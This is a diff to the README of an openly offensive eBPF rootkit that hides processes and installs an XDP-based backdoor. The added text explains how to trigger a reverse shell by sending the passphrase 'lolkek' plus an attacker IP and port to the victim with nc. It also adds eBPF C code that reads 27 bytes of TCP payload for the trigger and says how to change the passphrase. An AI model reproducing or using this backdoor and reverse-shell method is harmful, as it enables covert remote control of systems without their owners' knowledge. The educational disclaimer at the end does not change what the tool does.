@@ -31,6 +31,8 @@ go generate
 go build -o ebpf-rootkit
 ```
 
+## Usage
+
 Run with root privileges:
 
 ```bash
@@ -39,6 +41,16 @@ Launch Options:
 -p <PID> - PID of the process to hide (default: PID of the program itself)
 -t <PPID> - Parent PID, will only affect its child processes
 -i <interface> - Network interface to attach the XDP program to (default: eth0)
+```
+
+
+To launch the reverse shell, send a TCP packet containing your passphrase followed by the IP address and port to connect to, for example:
+
+```bash
+nc 192.168.1.100 22 # connect to victim machine with backdoor to any open port
+
+# send command to nc
+lolkek 192.168.123.200 4444
 ```
 
 ## Changing the Passphrase for the Reverse Shell
@@ -50,23 +62,42 @@ if strings.Contains(dataStr, "lolkek") {
     log.Printf("XDP: Found 'lolkek' trigger in packet data: %q", dataStr)
     parts := strings.Fields(dataStr)
 
-....
+...
 ```
 
-To change the passphrase, replace the string `lolkek` with your own phrase. This phrase is used as a trigger to launch the reverse shell.
+and the number of bytes received from tcp payload is equal to the number of characters sent for the backdoor. Now this number is equal to 27
+```bash
+lolkek 192.168.123.200 4444 #27 characters
+```
+
+```C
+//GET TCP DATA
+unsigned char *tcpdata = (unsigned char *)tcp + tcp_header_bytes;
+
+if ((void *)(tcpdata + 27) > data_end) {
+    return XDP_PASS;
+}
+
+// Reserve space in the ring buffer
+void *ringbuf_space = bpf_ringbuf_reserve(&xdprb, tcp_header_bytes, 0);
+if (!ringbuf_space) {
+    return XDP_PASS;  // If reservation fails, skip processing
+}
+
+// Copy the TCP header bytes into the ring buffer
+// Using a loop to ensure compliance with eBPF verifier
+for (int i = 0; i < 27; i++) {
+    unsigned char byte = *((unsigned char *)tcpdata + i);
+    ((unsigned char *)ringbuf_space)[i] = byte;
+}
+```
+
+**To change the passphrase, replace the string `lolkek` with your own phrase. This phrase is used as a trigger to launch the reverse shell. And the number of bytes to be received.**
 
 After changing the passphrase, you need to rebuild the project:
 
 `go build -o ebpf-rootkit`
 
-To launch the reverse shell, send a TCP packet containing your passphrase followed by the IP address and port to connect to, for example:
-
-```bash
-nc 192.168.1.100 22 # connect to victim machine with backdoor to any open port
-
-# send command to nc
-lolkek 192.168.1.200 4444
-```
 
 ### Disclaimer
 This tool is intended for educational purposes and security research only. Using this tool on systems without proper authorization may be illegal.
